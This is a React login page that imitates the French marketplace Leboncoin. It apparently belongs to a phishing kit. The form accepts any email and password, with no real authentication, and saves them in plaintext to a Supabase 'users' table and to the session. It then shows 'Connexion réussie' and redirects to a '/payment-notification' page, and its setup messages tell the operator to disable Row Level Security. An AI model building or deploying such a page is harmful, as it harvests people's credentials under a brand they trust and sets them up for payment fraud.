import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { updateUserSession } from "@/utils/sessionUtils";
import { toast } from "sonner";
import { supabase, getUserByEmail, upsertUser, verifyUsersTableExists } from "@/utils/supabaseClient";

const Login: React.FC = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [tableStatus, setTableStatus] = useState<{exists: boolean, hasRls: boolean} | null>(null);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const navigate = useNavigate();

  useEffect(() => {
    // Vérifier si la table users existe lors du chargement de la page
    const checkTable = async () => {
      const status = await verifyUsersTableExists();
      setTableStatus(status);
      
      if (!status.exists) {
        toast.error("Configuration Supabase: Table 'users' non trouvée. Veuillez configurer votre base de données.");
        console.error("La table 'users' n'existe pas dans Supabase. Veuillez créer cette table.");
        setErrorMessage("La table 'users' n'existe pas dans Supabase.");
      } else if (status.hasRls) {
        toast.warning("La table 'users' a des politiques RLS qui peuvent bloquer les opérations.");
        console.warn("La table users a des politiques Row Level Security (RLS) activées.");
        setErrorMessage("Attention: Row Level Security (RLS) est activée sur la table 'users'.");
      }
    };
    
    checkTable();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMessage(null);

    if (!email || !password) {
      toast.error("Veuillez remplir tous les champs");
      setIsLoading(false);
      return;
    }

    // Vérifier si la table existe avant de continuer
    if (tableStatus && !tableStatus.exists) {
      toast.error("La base de données n'est pas configurée correctement");
      setIsLoading(false);
      return;
    }

    try {
      // Prépare les données utilisateur à enregistrer
      const userData = {
        email,
        password
      };
      
      // Vérifie si l'utilisateur existe déjà
      let existingUser = null;
      try {
        existingUser = await getUserByEmail(email);
      } catch (error: any) {
        console.error("Erreur lors de la vérification de l'utilisateur:", error);
        
        // Gestion spécifique des erreurs RLS
        if (error.isRlsError) {
          setErrorMessage(`Erreur de sécurité (RLS): Vous n'avez pas les permissions nécessaires pour accéder aux données. 
                          Veuillez désactiver RLS dans Supabase ou configurer les politiques appropriées.`);
          toast.error("Erreur de sécurité: Row Level Security");
          setIsLoading(false);
          return;
        }
      }
      
      // Enregistre ou met à jour l'utilisateur dans Supabase
      try {
        await upsertUser(userData);
      } catch (error: any) {
        console.error("Erreur lors de l'enregistrement de l'utilisateur:", error);
        
        // Gestion spécifique des erreurs RLS
        if (error.isRlsError) {
          setErrorMessage(`Erreur de sécurité (RLS): Vous n'avez pas les permissions nécessaires pour modifier les données. 
                          Veuillez désactiver RLS dans Supabase ou configurer les politiques appropriées.`);
          toast.error("Erreur de sécurité: Row Level Security");
          setIsLoading(false);
          return;
        }
        
        throw error;
      }
      
      // Stocke les informations dans la session
      updateUserSession({ email, password });
      
      toast.success("Connexion réussie");
      
      // Naviguer vers la page suivante
      navigate("/payment-notification");
    } catch (error: any) {
      console.error("Erreur lors de la connexion:", error);
      
      // Message d'erreur détaillé pour faciliter le débogage
      const detailedError = error.message || "Une erreur inconnue est survenue";
      setErrorMessage(`Erreur lors de la connexion: ${detailedError}`);
      
      toast.error("Une erreur est survenue lors de la connexion");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="w-full py-4 border-b border-gray-200">
        <div className="container mx-auto px-4 flex items-center">
          <img 
            src="/logo.svg" 
            alt="Leboncoin" 
            className="h-8" 
          />
          <div className="ml-auto flex items-center text-leboncoin-orange font-medium">
            <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
              <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
            </svg>
            Connexion
          </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md p-8 bg-white rounded-lg shadow-sm border border-gray-100 animate-scale-in">
          <h1 className="text-3xl font-bold text-center mb-6">Bonjour !</h1>
          
          {tableStatus && !tableStatus.exists && (
            <div className="mb-6 p-3 bg-red-100 text-red-700 rounded-md">
              <p className="text-center">
                <strong>Attention:</strong> La table 'users' n'est pas configurée dans Supabase.
              </p>
              <p className="text-center text-sm mt-1">
                Veuillez vérifier votre configuration Supabase et créer la table 'users'.
              </p>
            </div>
          )}
          
          {tableStatus && tableStatus.hasRls && (
            <div className="mb-6 p-3 bg-yellow-100 text-yellow-800 rounded-md">
              <p className="text-center">
                <strong>Attention:</strong> Row Level Security (RLS) est activée sur la table 'users'.
              </p>
              <p className="text-center text-sm mt-1">
                Cela peut empêcher l'insertion/modification des données. Veuillez désactiver RLS ou configurer les politiques appropriées.
              </p>
            </div>
          )}
          
          {errorMessage && (
            <div className="mb-6 p-3 bg-red-100 text-red-700 rounded-md">
              <p className="text-sm whitespace-pre-line">
                {errorMessage}
              </p>
              <div className="mt-2 text-xs text-red-600">
                <details>
                  <summary>Informations techniques</summary>
                  <p className="mt-1">
                    L'erreur "row-level security policy" indique que les politiques de sécurité RLS de Supabase 
                    empêchent l'opération. Veuillez:
                  </p>
                  <ol className="list-decimal pl-5 mt-1 space-y-1">
                    <li>Aller dans le dashboard Supabase ➔ Table Editor ➔ table 'users'</li>
                    <li>Cliquer sur "Authentication"</li>
                    <li>Désactiver RLS ou cliquer sur "New Policy" pour ajouter les permissions nécessaires</li>
                  </ol>
                </details>
              </div>
            </div>
          )}
          
          <p className="text-center text-gray-600 mb-8">
            Connectez-vous pour découvrir toutes nos fonctionnalités.
          </p>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
                E-mail
              </label>
              <input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="form-input"
                placeholder="Votre adresse email"
              />
            </div>

            <div>
              <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
                Mot de passe
              </label>
              <input
                id="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="form-input"
                placeholder="Votre mot de passe"
              />
            </div>

            <div className="flex justify-start">
              <a href="#" className="text-leboncoin-blue hover:underline text-sm">
                Mot de passe oublié?
              </a>
            </div>

            <button
              type="submit"
              className="primary-button flex items-center justify-center"
              disabled={isLoading || (tableStatus && !tableStatus.exists)}
            >
              {isLoading ? (
                <span className="loading-spinner" />
              ) : (
                "Se connecter"
              )}
            </button>
          </form>

          <div className="mt-8 text-center">
            <p className="text-gray-500 mb-2">Envie de nous rejoindre ?</p>
            <a href="#" className="text-leboncoin-blue hover:underline">
              Créer un compte
            </a>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Login;
